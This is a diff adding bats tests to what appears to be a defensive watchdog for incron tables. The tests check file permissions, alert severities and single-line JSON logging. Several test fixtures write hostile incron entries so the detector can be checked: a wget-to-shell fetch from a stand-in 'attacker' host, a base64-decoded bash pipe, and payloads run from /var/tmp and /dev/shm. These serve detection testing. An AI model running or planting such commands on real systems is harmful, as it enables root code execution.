@@ -130,3 +130,69 @@ seed_benign() {
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — incron inventory enumerates attacker-triggerable root-exec surface)" {
+    seed_benign
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (wget-pipe-sh in command): wget bootstrap → alert" {
+    seed_benign
+    run_wd
+    printf '/etc/nginx IN_MODIFY wget -qO- http://attacker/p | sh\n' > "${TAB}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe in command): obfuscation → alert" {
+    seed_benign
+    run_wd
+    printf '/etc/nginx IN_MODIFY echo YmFzaCAtaQ== | base64 -d | bash\n' > "${TAB}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (command under /var/tmp): writable-root expansion" {
+    seed_benign
+    run_wd
+    printf '/etc/nginx IN_MODIFY /var/tmp/.attacker-payload\n' > "${TAB}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (command under /dev/shm): tmpfs writable-root coverage" {
+    seed_benign
+    run_wd
+    printf '/etc/nginx IN_MODIFY /dev/shm/.attacker-payload\n' > "${TAB}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (group-writable incron table): group-writable → alert above world-writable bar" {
+    seed_benign
+    run_wd
+    chmod 0664 "${TAB}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "INVARIANT (pre-existing world-writable table): baseline_initial fires alert at install-time" {
+    seed_benign
+    chmod 0666 "${TAB}"
+    run_wd
+    cap | grep -q '"event":"baseline_initial"'
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    seed_benign
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-incron -- ')
+    [ "${main_count}" = "1" ]
+}
